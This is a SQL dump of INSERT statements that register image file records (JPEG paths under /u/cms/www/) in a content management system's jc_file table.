INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111737053v9i.jpg','111737053v9i.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173708ffx2.jpg','11173708ffx2.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173711toqx.jpg','11173711toqx.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173718do4k.jpg','11173718do4k.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173719ykxk.jpg','11173719ykxk.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173724ul7o.jpg','11173724ul7o.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11173804j6hj.jpg','11173804j6hj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11174436pnoi.jpg','11174436pnoi.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/11174439eb3l.jpg','11174439eb3l.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1117444317kg.jpg','1117444317kg.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111744466aux.jpg','111744466aux.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/111745157ps9.jpg','111745157ps9.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12105715powr.jpg','12105715powr.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12105715u0i2.jpg','12105715u0i2.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12105716avso.jpg','12105716avso.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12105716f0ks.jpg','12105716f0ks.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12105716u081.jpg','12105716u081.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12105717rgdv.jpg','12105717rgdv.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12105908yuqz.jpg','12105908yuqz.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121101457hlo.jpg','121101457hlo.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121101459s0t.jpg','121101459s0t.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110145r34m.jpg','12110145r34m.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110146fexh.jpg','12110146fexh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110146v1cq.jpg','12110146v1cq.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110146ynj3.jpg','12110146ynj3.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110240hrzh.jpg','12110240hrzh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121104013vts.jpg','121104013vts.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110726kcxc.jpg','12110726kcxc.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110726rqp4.jpg','12110726rqp4.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121107270owq.jpg','121107270owq.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1211072762wj.jpg','1211072762wj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110728cz8z.jpg','12110728cz8z.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110728hvna.jpg','12110728hvna.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12110817ejy1.jpg','12110817ejy1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111106jy1l.jpg','12111106jy1l.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111106lobh.jpg','12111106lobh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111106zad3.jpg','12111106zad3.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111106zedy.jpg','12111106zedy.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111107ctqg.jpg','12111107ctqg.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111107l4wg.jpg','12111107l4wg.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1211124392sy.jpg','1211124392sy.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111518igwr.jpg','12111518igwr.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111518kvd2.jpg','12111518kvd2.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111518l3p5.jpg','12111518l3p5.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111518vk7v.jpg','12111518vk7v.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121115195muw.jpg','121115195muw.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12111519tyc2.jpg','12111519tyc2.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1211190051if.jpg','1211190051if.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12112124imh5.jpg','12112124imh5.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121121253f1z.jpg','121121253f1z.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121121265tk1.jpg','121121265tk1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121121267h0z.jpg','121121267h0z.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12112127795n.jpg','12112127795n.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12112128ltfy.jpg','12112128ltfy.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12112247lfhe.jpg','12112247lfhe.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12120435rmvm.jpg','12120435rmvm.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12120436on4w.jpg','12120436on4w.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121204384v5d.jpg','121204384v5d.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121204408a3o.jpg','121204408a3o.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1212044200gm.jpg','1212044200gm.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121207389dlf.jpg','121207389dlf.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134158q84h.jpg','12134158q84h.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134158qzrx.jpg','12134158qzrx.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121341597c2x.jpg','121341597c2x.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134159kbxa.jpg','12134159kbxa.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134159robe.jpg','12134159robe.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134200cwyl.jpg','12134200cwyl.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134300ap1h.jpg','12134300ap1h.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134450lo6n.jpg','12134450lo6n.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134450mwvm.jpg','12134450mwvm.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134451j9p9.jpg','12134451j9p9.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134451k1zj.jpg','12134451k1zj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134452b2g1.jpg','12134452b2g1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134452bb5z.jpg','12134452bb5z.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134552bk69.jpg','12134552bk69.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121348103ux5.jpg','121348103ux5.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121348109k92.jpg','121348109k92.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121348110tfi.jpg','121348110tfi.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134811y9du.jpg','12134811y9du.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134812unit.jpg','12134812unit.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12134933sxsx.jpg','12134933sxsx.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135148im9s.jpg','12135148im9s.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135149ar88.jpg','12135149ar88.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135149bhlg.jpg','12135149bhlg.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135149s2wm.jpg','12135149s2wm.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135243x57l.jpg','12135243x57l.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135606e58j.jpg','12135606e58j.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135607ftvv.jpg','12135607ftvv.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135607vqhp.jpg','12135607vqhp.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135608ad8p.jpg','12135608ad8p.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135608l3ai.jpg','12135608l3ai.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135609wexl.jpg','12135609wexl.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135827xy0y.jpg','12135827xy0y.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12135944xk9f.jpg','12135944xk9f.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12140033b5mx.jpg','12140033b5mx.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12140434ixtu.jpg','12140434ixtu.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12140434n4th.jpg','12140434n4th.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12140435relm.jpg','12140435relm.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12140436rua8.jpg','12140436rua8.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12140436wwsc.jpg','12140436wwsc.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12140851yp14.jpg','12140851yp14.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12141311nuua.jpg','12141311nuua.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12141311xxbj.jpg','12141311xxbj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12141312d3p6.jpg','12141312d3p6.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12141312r6eb.jpg','12141312r6eb.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1214131399h0.jpg','1214131399h0.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12141313ndlq.jpg','12141313ndlq.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121414505xah.jpg','121414505xah.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142118fe7p.jpg','12142118fe7p.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121421197sla.jpg','121421197sla.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142119m8y5.jpg','12142119m8y5.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142120loqu.jpg','12142120loqu.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142120u2tx.jpg','12142120u2tx.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1214212172bk.jpg','1214212172bk.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142322wa0z.jpg','12142322wa0z.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142734jwmh.jpg','12142734jwmh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142735jqmu.jpg','12142735jqmu.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142735rhib.jpg','12142735rhib.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1214273617d5.jpg','1214273617d5.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142736ue6c.jpg','12142736ue6c.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142737cr9y.jpg','12142737cr9y.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12142830poeb.jpg','12142830poeb.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1214325480ue.jpg','1214325480ue.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12143254y1wh.jpg','12143254y1wh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121432556ttu.jpg','121432556ttu.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12143255ryzh.jpg','12143255ryzh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12143255ukxu.jpg','12143255ukxu.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12143256g1bo.jpg','12143256g1bo.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12143342sfmg.jpg','12143342sfmg.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121454345gdz.jpg','121454345gdz.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12145434959z.jpg','12145434959z.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12145434qkiz.jpg','12145434qkiz.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12145435lmi6.jpg','12145435lmi6.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12145435u9c1.jpg','12145435u9c1.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121456599tnd.jpg','121456599tnd.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12150556da16.jpg','12150556da16.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12150556inf7.jpg','12150556inf7.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12150557dzrz.jpg','12150557dzrz.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12150557etcp.jpg','12150557etcp.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12150701tmkd.jpg','12150701tmkd.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12150936264i.jpg','12150936264i.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121509368460.jpg','121509368460.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12150936cnpa.jpg','12150936cnpa.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121509371kyv.jpg','121509371kyv.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12150937xe3g.jpg','12150937xe3g.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12151139jrv6.jpg','12151139jrv6.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1215211539ic.jpg','1215211539ic.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12152115dymp.jpg','12152115dymp.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12152115n7ee.jpg','12152115n7ee.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12152115oqbj.jpg','12152115oqbj.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12152116am9n.jpg','12152116am9n.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12152257va9g.jpg','12152257va9g.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12153550461x.jpg','12153550461x.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12153550ryso.jpg','12153550ryso.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12153551fflz.jpg','12153551fflz.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12153551igy5.jpg','12153551igy5.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12153551r5kz.jpg','12153551r5kz.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121535526foq.jpg','121535526foq.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121536505s2h.jpg','121536505s2h.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121542148jkc.jpg','121542148jkc.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121542158t1n.jpg','121542158t1n.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121542159xil.jpg','121542159xil.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12154215ryyk.jpg','12154215ryyk.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12154215y02n.jpg','12154215y02n.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12154216egtt.jpg','12154216egtt.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121543059cct.jpg','121543059cct.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12154708kkn6.jpg','12154708kkn6.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12154708nsye.jpg','12154708nsye.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12154708we6w.jpg','12154708we6w.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12154709iod3.jpg','12154709iod3.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/12154709ypkl.jpg','12154709ypkl.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/121547582f5t.jpg','121547582f5t.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/1311420498g8.jpg','1311420498g8.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/131203117zrn.jpg','131203117zrn.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/131257327chh.jpg','131257327chh.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/13141220dfer.jpg','13141220dfer.jpg',1,NULL);
INSERT INTO `jc_file` (`file_path`,`file_name`,`file_isvalid`,`content_id`) VALUES ('/u/cms/www/131423399l1z.jpg','131423399l1z.jpg',1,NULL);
